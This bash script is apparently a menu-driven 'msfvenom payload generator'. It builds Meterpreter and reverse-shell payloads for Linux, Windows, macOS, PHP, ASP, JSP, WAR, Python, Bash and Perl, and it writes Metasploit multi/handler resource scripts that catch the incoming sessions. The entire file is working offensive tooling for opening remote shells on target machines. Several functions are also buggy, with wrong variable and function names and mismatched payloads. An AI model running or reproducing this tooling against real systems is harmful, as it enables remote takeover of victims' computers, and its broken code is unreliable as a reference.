#!/bin/bash
##### (Cosmetic) Colour output
RED="\033[01;31m"      # Issues/Errors
GREEN="\033[01;32m"    # Success
YELLOW="\033[01;33m"   # Warnings/Information
BLUE="\033[01;34m"     # Heading
BOLD="\033[01;01m"     # Highlight
RESET="\033[00m"       # Normal
linuxpayload()
{
	echo "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f elf > shell.elf"
	echo -e "$YELLOW"
	echo -e "\n #############################################"
	read -p "enter lhost:" llh
	echo -e " \n #############################################"
	read -p "lport" llp
	echo -e " \n #############################################"
	read -p "output" llo
	echo -e " \n #############################################"
	echo -e "$GREEN"
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$llh LPORT=$llp -f elf > $llo.elf
	##rc creation for linux payload
	linuxrc
	start
}

windowspayload()
{
	echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f exe > shell.exe"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" wlh
	echo -e " \n #############################################"
	read -p "enter lport" wlp
	echo -e " \n #############################################"
	read -p "output" wlo
	echo -e " \n #############################################"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$wlh LPORT=$wlp -f exe > $wlo.exe
	winrc
	start
}

macpayload()
{
	echo "msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f macho > shell.macho"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" mlh
	echo -e " \n #############################################"
	read -p "enter lport" mlp
	echo -e " \n #############################################"
	read -p "output" mlo
	msfvenom -p osx/x86/shell_reverse_tcp LHOST=$mlh LPORT=$mlp -f macho > $mlo.macho
	macrc
	start
}
phppayload()
{
	echo "msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.php && cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read  -p "enter lhost:" plh
	echo -e " \n #############################################"
	read -p "lport" plp
	echo -e " \n #############################################"
	read -p  "output " plo 
	echo -e " \n #############################################"
	msfvenom -p php/meterpreter_reverse_tcp LHOST=$plh LPORT=$plp -f raw > $plo.php  
	phprc
	start 
}

asppayload()
{
	echo "msfvenom -p windows/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f asp > shell.asp"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" alh
	echo -e " \n #############################################"
	read -p "lport"  alp
	echo -e " \n #############################################"
	read -p "output" alo
	echo -e " \n #############################################"
	msfvenom -p windows/meterpreter/reverse_tcp LHOST=$alh LPORT=$alp -f asp > $alo.asp
	asprc
	start
}

jsppayload()
{
	echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.jsp"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" jlh
	echo -e " \n #############################################"
	read -p "lport" jlp
	echo -e " \n #############################################"
	read -p "output"jlo
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$jlh LPORT=$jlp -f raw > $jls.jsp
	jsprc
	start
}

warpayload()
{
	echo "msfvenom -p java/jsp_shell_reverse_tcp LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f war > shell.war"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" wwlh
	echo -e " \n #############################################"
	read -p "lport" wwlp
	echo -e " \n #############################################"
	read -p "output" wwlo
	echo -e " \n #############################################"
	msfvenom -p java/jsp_shell_reverse_tcp LHOST=$wwlh LPORT=$wwlp -f war > $wwlo.war
	warrc
	start
}
pythonpayload()
{
	echo "msfvenom -p cmd/unix/reverse_python LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.py"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" plh	
	echo -e " \n #############################################"
	read -p "lport" plp
	echo -e " \n #############################################"
	read -p "output" plo
	echo -e " \n #############################################"
	msfvenom -p cmd/unix/reverse_python LHOST=$plh LPORT=$plp -f raw > $plo.py
	pyrc
	start
}
bashpayload()
{
	echo "msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.sh"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" ulh
	echo -e " \n #############################################"
	read -p "lport" ulp
	echo -e " \n #############################################"
	read -p "output" ulo
	echo -e " \n #############################################"
	msfvenom -p cmd/unix/reverse_bash LHOST=$ulh LPORT=$ulp -f raw > $ulo.sh
	barc
	start
}
perlpayload()
{
	echo "msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Your Port to Connect On> -f raw > shell.pl"
	echo -e "$YELLOW"
	echo -e " \n #############################################"
	read -p "enter lhost:" prh
	echo -e " \n #############################################"
	read -p "lport" prp 
	echo -e " \n #############################################"
	read -p "output" pro
	echo -e " \n #############################################"
	msfvenom -p cmd/unix/reverse_perl LHOST=$prh LPORT=$prp -f raw > $pro.pl
	perc
	start
}
## resource script starts
linuxrc()
{   
		echo -e "$RED"
		read -p "enter rc name" lrc
		echo -e "\n your metsploit rc wil be saved in  $PWD" 
		touch $lrc.rc
		echo "workspace $lrc">${lrc}.rc
		echo "use exploit/multi/handler">>${lrc}.rc
		echo "set payload linux/x86/meterpreter/reverse_tcp">>${lrc}.rc
		echo "set lhost $llh" >>${lrc}.rc
		echo "set lport $llp" >>${lrc}.rc
		echo "exploit -j -z" >> ${lrc}.rc
		echo 
}
windowsrc()
{  
		echo -e "$RED"
		read -p "enter rc name" winrc
		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $winrc.rc
		echo "workspace $winrc">${winrc}.rc
		echo "use exploit/multi/handler">>${winrc}.rc
		echo "set payload windows/meterpreter/reverse_tcp ">>${winrc}.rc
		echo "set lhost $wlh" >>${winrc}.rc
		echo "set lport $wlp" >>${winrc}.rc
		echo "exploit -j -z" >> ${winrc}.rc
		
}
macrc()
{ 
		echo -e "$RED"
		read -p "enter rc name" macrc
		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $macrc.rc
		echo "workspace $macrc">${macrc}.rc
		echo "use exploit/multi/handler">>${macrc}.rc
		echo "set payload osx/x86/shell_reverse_tcp ">>${macrc}.rc
		echo "set lhost $mlh" >>${macrc}.rc
		echo "set lport $mlp" >>${macrc}.rc
		echo "exploit -j -z" >> ${macrc}.rc
		
}
phprc()
{   
		echo -e "$RED"
		read -p "enter rc name" phprc
		
		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $phprc.rc
		echo "workspace $phprc">${phprc}.rc
		echo "use exploit/multi/handler">>${phprc}.rc
		echo "set payload php/meterpreter_reverse_tcp ">>${phprc}.rc
		echo "set lhost $plh" >>${phprc}.rc
		echo "set lport $plp" >>${phprc}.rc
		echo "exploit -j -z" >> ${phprc}.rc
		
}
asprc()
{  
		echo -e "$RED"
		read -p "enter rc name" asprc
		
		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $asprc.rc
		echo "workspace $asprc">${asprc}.rc
		echo "use exploit/multi/handler">>${asprc}.rc
		echo "set payload windows/meterpreter/reverse_tcp">>${asprc}.rc
		echo "set lhost $alh" >>${asprc}.rc
		echo "set lport $alp" >>${asprc}.rc
		echo "exploit -j -z" >> ${asprc}.rc
		
}
jsprc()
{   
		echo -e "$RED"
		read -p "enter rc name" jsprc

		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $jsprc.rc
		echo "workspace $jsprc">${jsprc}.rc
		echo "use exploit/multi/handler">>${jsprc}.rc
		echo "set  payload java/jsp_shell_reverse_tcp">>${jsprc}.rc
		echo "set lhost $jlh" >>${jsprc}.rc
		echo "set lport $jlp" >>${phprc}.rc
		echo "exploit -j -z" >> ${phprc}.rc
}	
warrc()
{   
		echo -e "$RED"
		read -p "enter rc name" warrc
		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $warrc.rc
		echo "workspace $warrc">${warrc}.rc
		echo "use exploit/multi/handler">>${warrc}.rc
		echo "set  payload java/jsp_shell_reverse_tcp">>${warrc}.rc
		echo "set lhost $wwlh" >>${warrc}.rc
		echo "set lport $wwlp" >>${warrc}.rc
		echo "exploit -j -z" >> ${warrc}.rc
}
pyrc()
{ 
		echo -e "$RED"
		read -p "enter rc name" pyrc

		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $pyrc.rc
		echo "workspace $pyrc">${pyrc}.rc
		echo "use exploit/multi/handler">>${pyc}.rc
		echo "set  payload cmd/unix/reverse_python">>${pyrc}.rc
		echo "set lhost $plh" >>${pyrc}.rc
		echo "set lport $plp" >>${pyrc}.rc
		echo "exploit -j -z" >> ${pyrc}.rc
}
barc()
{       
	
		echo -e "$RED"
		read -p "enter rc name" barc
		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $barc.rc
		echo "workspace $barc">${barc}.rc
		echo "use exploit/multi/handler">>${barc}.rc
		echo "set  payload cmd/unix/reverse_bash">>${barc}.rc
		echo "set lhost $ulh" >>${barc}.rc
		echo "set lport $ulp" >>${barc}.rc
		echo "exploit -j -z" >> ${barc}.rc
}
perc()
{   
		echo -e "$RED"
		read -p "enter rc name" perc
		echo -e "\n your metsploit rc wil be saved in  $PWD"
		touch $perc.rc
		echo "workspace $perc">${perc}.rc
		echo "use exploit/multi/handler">>${perc}.rc
		echo "set  payload cmd/unix/reverse_bash">>${perc}.rc
		echo "set lhost $prh" >>${perc}.rc
		echo "set lport $prp" >> ${perc}.rc
		echo "exploit -j -z" >> ${perc}.rc
}
start(){
	 echo -e "$GREEN"
cat << "EOF"
                __                                 
 _ __ ___  ___ / _|_   _____ _ __   ___  _ __ ___  
| '_ ` _ \/ __| |_\ \ / / _ \ '_ \ / _ \| '_ ` _ \ 
| | | | | \__ \  _|\ V /  __/ | | | (_) | | | | | |
|_| |_| |_|___/_|   \_/ \___|_| |_|\___/|_| |_| |_|

                  _                 _ 
 _ __   __ _ _   _| | ___   __ _  __| |
| '_ \ / _` | | | | |/ _ \ / _` |/ _` |
| |_) | (_| | |_| | | (_) | (_| | (_| |
| .__/ \__,_|\__, |_|\___/ \__,_|\__,_|
|_|          |___/   

  __ _  ___ _ __  _ __ __ _| |_ ___  _ __ 
 / _` |/ _ \ '_ \| '__/ _` | __/ _ \| '__|
| (_| |  __/ | | | | | (_| | || (_) | |   
 \__, |\___|_| |_|_|  \__,_|\__\___/|_|   
 |___/   
         _        ___  
__   __ / |      / _ \ 
\ \ / / | |     | | | |
 \ V /  | |  _  | |_| |
  \_/   |_| (_)  \___/ 
                       

EOF

echo -e "$YELLOW"
echo -e "${BLUE} @5bhuv4n35h - shankar bhuvanesh"
echo -e "${BLUE} Contribute and collaborate to the easload genrator v1.0 https://github.com/5bhuv4n35h/easy_msfpc_payload_genrator/"
echo -e "$GREEN"
## main loop starts
options=("binaries" "webpayloads" "scritpting payloads" "Quit")
select opt in "${options[@]}"
do
    case $opt in
    	"binaries")
        	choice1=("Linux" "windows" "mac" "back to main menu" "quit")
         	select ch1 in "${choice1[@]}"
         	do
         	case $ch1 in
         		"Linux")
				linuxpayload
              	;;
            	"windows")
				windowspayload
 				;;
 				"mac")
				macpayload
 				;;
 				"back to main menu")
 				start
				;;
				"quit")
				exit 0;
				;;
				*)
         		echo -e "\n invalid option "
        		;;
    esac
done
;;
"webpayloads")
## start of loop2
 choice2=("php" "Asp" "jsp" "war"  "menu" "exit")
 select ch2 in "${choice2[@]}"
         do
        case $ch2  in
         		"php") 
				phppayload
				;;
         		"Asp")
				asppayload
				;;
           		"jsp")
				jsppayload
				;;

            	"war")
				warpayload
				;;
                "menu")
				start
				;;
				"exit")
				exit 0;
				;;
				*)
         		echo -e "\n invalid option "
        		;;
				esac 
          done
;;
##end of loop2
"scritpting payloads")
###loop3
choice3=("python" "bash" "perl" "main menu" "exit")
 select ch3 in "${choice3[@]}"
         do
      case $ch3 in
        	"python")
			pythonpayload
			;;
			"bash")
			bashpayload
			;;
			"perl")
			perlpayload
     		;;
			"main menu")
			start
			;;
 			"exit")
			exit 0;
			;;
			*)
         	echo -e "\n invalid option "
        	;;
##end of loop3
   esac 
  done
;;
"Quit")
  	exit 0;
;;
*)
	echo -e "\n invalid option "
	echo -e "back to main menu"
	start 
;;

###end of main loop

esac
done
}
stop()
{
	exit
}
if [ $? -eq 0 ]
 then
	msfd=$(dpkg -l  | grep "msfpc")
	if [ "$msfd" ]; then
		start
    	    else 
       	 	   	echo -e "msfpc / msfvenom is not installed" 	
    fi
	
    else
  		stop	
fi
